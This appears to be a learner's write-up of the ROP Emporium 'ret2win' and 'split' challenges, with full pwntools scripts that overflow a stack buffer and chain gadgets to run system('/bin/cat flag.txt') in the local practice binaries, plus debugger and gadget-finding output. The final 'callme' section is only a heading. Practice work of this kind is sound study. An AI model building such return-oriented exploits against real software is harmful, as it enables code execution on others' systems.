# ROP Emporium

This file will include writeups for the ROP Emporium Return Oriented Programming challenges. I am in no means an expert on the ROP exploit technique and this will be purely for a learning purpose.

## Ret2win

**Description:** Locate a method that you want to call within the binary.
Call it by overwriting a saved return address on the stack.

This is the first challenge on ROP Emporioum and here we need to return to a function in the binary by overwriting a saved return address which is currently on the stack. Overwriting this saved return address with a different address (in this case of the function we want to call) will make the `ret` keyword pop this new value on (or in??) to the `rip` register, essentially redirecting execution.

Finding this function can be done in many ways, I chose to use Ghidra to decompile the binary for starters. Using ghidra we easily see that there is a function called `ret2win` in the binary. This function will use `system()` to print the flag for us:

```C
void ret2win(void)

{
  puts("Well done! Here\'s your flag:");
  system("/bin/cat flag.txt");
  return;
}
```

We simply need to redirect execution to this function. We will use pwndbg to figure out where in memory this is located and try to use pwntools with Python to solve it.

Using `checksec` we see that the stack is NX protected but also that PIE is not enabled: 

```checksec
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Using GDB we can print the location of the `ret2win` function by typing `print ret2win` which will result in `$1 = {<text variable, no debug info>} 0x400756 <ret2win>`.

To find the offset we can use cyclic with `cyclic -n 8 100` to generate a 8 byte repeating pattern of a 100 characters. Inputing this pattern and searching for the value the `rsp` register is poiting to, will give us the offset needed to overwrite the return address. *Note* we need to set `-n 8` because the binary is 64bit.

Then using `cyclic -n 8 -l faaaaaaa` (faaaaaaa in my case as this was the pattern found in `rsp`, this might change for others). we see that the offset is 40. Meaning we need 40 characters of junk followed by the address of `ret2win`:

```python
from pwn import *

chall = './ret2win-1/ret2win'

context.binary = chall
context.bits = 64

ret2win_address = p64(0x400756)
print(ret2win_address)
offset = b'A'*40

payload = [
    offset,
    ret2win_address
]

payload = b"".join(payload)

p = process([chall])

p.recvuntil(b'>')

p.sendline(payload)
p.interactive()
```

Using this script it looks like we should get the flag, but the process segfaults just before printing it:

 ```bash
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
b'V\x07@\x00\x00\x00\x00\x00'
[+] Starting local process './ret2win-1/ret2win': pid 51754
[*] Switching to interactive mode
Thank you!
Well done! Here's your flag:
[*] Got EOF while reading in interactive
$ 
[*] Process './ret2win-1/ret2win' stopped with exit code -11 (SIGSEGV) (pid 51754)
[*] Got EOF while sending in interactive
 ```

This is due to the nature of 64 bit systems where stack alignment is needed due to `movaps` which needs the stack to be 16-bit aligned. See [ironstone](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/stack-alignment) for more info.

Keeping this in mind, as seen on the link above, we need to use a singular `ret;` instruction gadget to align the stack. We can use `ROPgadget` to find such a gadget. `ROPgadget --binary ret2win` and sure enough it finds a gadget at address `0x000000000040053e : ret`. Including this instruction just before the call to `ret2win` will allow for execution of `system(/bin/cat flag
txt)`. 

```python
from pwn import *

chall = './ret2win-1/ret2win'

context.binary = chall
context.bits = 64

ret2win_address = p64(0x400756)
print(ret2win_address)
ret_gadget = p64(0x40053e)
offset = b'A'*40

payload = [
    offset,
    ret_gadget,
    ret2win_address
]

payload = b"".join(payload)

p = process([chall])

p.recvuntil(b'>')

p.sendline(payload)
p.interactive()
```

Yet we receive:

```bash
Thank you!
Well done! Here's your flag:
/bin/cat: flag.txt: No such file or directory
```

Looking as it some path problems occur. Turns out something weird had happened with the folder strucuture, simply moving the files and python script to the folder from which the python script is called solved the issue!

```bash
Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```

This solves the first challenge!

## Split

**Description:** The elements that allowed you to complete ret2win are still present, they've just been split apart. Find them and recombine them using a short ROP chain.

This challenges makes use of some of the same concepts as ret2win did, here the difference is that everything is scattered througout the binary, not implemented into a single win function.

ROP Emporium shows us some quite neat tricks using `radare2's rabin2` package to examine the binary without opening a decompiler like Ghidra.

- Using `radare2.rabin2 -I split` we are able to inspect metadata about the binary such as security and architecure.
- Using `radare2.rabin2 -i split` we are able to see functions from shared libraries.
- Using `radare2.rabin2 -z split` is used to see strings deliberately put into the binary.
- Using `radare2.rabin2 -qs split` lists symbols (using -q for fewer results), to further filter for functions implemented by the programmer of the binary we can pipe the output into grep. The full command will be `radare2.rabin2 -qs split | grep -ve imp -e ' 0 '`.

Using these commands we find out that there are calls to `system` and that we have the string `/bin/cat flag.txt`. We also see the addresses for both `system` (`0x00400560`) and `/bin/cat flag.txt` (`0x00601060`).

In order to parse `/bin/cat flag.txt` to the `system()` function as an argument, we need to load the string into the `rdi` register, as per the calling convention for x86_64. This can be done with a `pop rdi; ret` gadget, and fortunately we have one at `0x4007c3`. Also noting that we have a `ret` gadget for stack alignment at `0x40053e`.

So in order to load `/bin/cat flag.txt` in the `rdi` register, we need to put the address of this value onto the stack, so it is loaded when `pop rdi; ret` is called. Our chain should look something like this:

```python
payload = [
    offset,
    pop_rdi,
    bash_string_address,
    system_call
]
```

And our actual python exploit code: 

```python
from pwn import *

chall = "./split"

context.binary = chall
context.bits = 64

pop_rdi = p64(0x4007c3)
stack_alignment = p64(0x40053e)
bash_string = p64(0x00601060)
system_call = p64(0x000000000040074b)

offset = b'A' * 40

# Put the bin/sh address on the stack, pop it into RDI, then call system with the string in RDI to supply it as the argument

payload = [
    offset,
    pop_rdi,
    bash_string,
    system_call
]

payload = b"".join(payload)

p = process([chall])

p.recvuntil(b'>')

p.sendline(payload)
p.interactive()
```

We have to go to our `pop rdi; ret` gadget first by manipulating the instruction pointer (basically popping `rip`) to go to the address of `pop rdi; ret`. When `pop rdi` gets executed the `RSP` (stack pointer) is going to be pointing to the address of the `/bin/cat/ flag.txt` address and loading it into `RDI`. Then we call system! One thing which i forgot in this challenge is that we should find a function where system is called, and then use the address of the call instruction instead of the acutal address of system in `@plt`. So to call `system` we find the call in `usefulFunction` and use the address of the `call 0x400560 <system@plt>` which is `0x000000000040074b`.

```assembler
   0x0000000000400742 <+0>: push   rbp
   0x0000000000400743 <+1>: mov    rbp,rsp
   0x0000000000400746 <+4>: mov    edi,0x40084a
   0x000000000040074b <+9>: call   0x400560 <system@plt>
   0x0000000000400750 <+14>: nop
   0x0000000000400751 <+15>: pop    rbp
   0x0000000000400752 <+16>: ret   
```

This solves split!

## callme

